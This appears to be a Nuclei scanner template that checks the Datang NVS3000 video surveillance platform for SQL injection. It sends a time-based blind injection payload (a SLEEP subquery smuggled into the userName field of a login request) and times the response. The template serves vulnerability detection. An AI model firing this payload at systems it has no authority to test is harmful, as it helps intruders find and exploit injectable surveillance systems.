id: datang-nvs3000-sqli
info:
  name: Datang NVS3000 Integrated Video Surveillance Platform SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    Exploits a SQL injection vulnerability in the Datang NVS3000 Integrated Video Surveillance Platform. This issue allows an attacker to execute arbitrary SQL queries.

variables:
  t1: "{{rand_int(4,9)}}"
  t2: "{{to_number(t1) + 2}}"

http:
  - method: POST
    path:
      - "{{BaseURL}}/nvsthird/ocxUserLogin"
    headers:
      Content-Type: application/json
    body: |
      {"userName":"asda' AND (SELECT 4094 FROM (SELECT(SLEEP({{t1}})))hyJC) AND 'FYBK'='FYBK","password":"sadsa","code":"67a5"}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"userId"'
      - type: word
        part: header
        words:
          - "application/json"
      - type: dsl
        dsl:
          - "duration > to_number(t1)"
          - "duration < to_number(t2)"
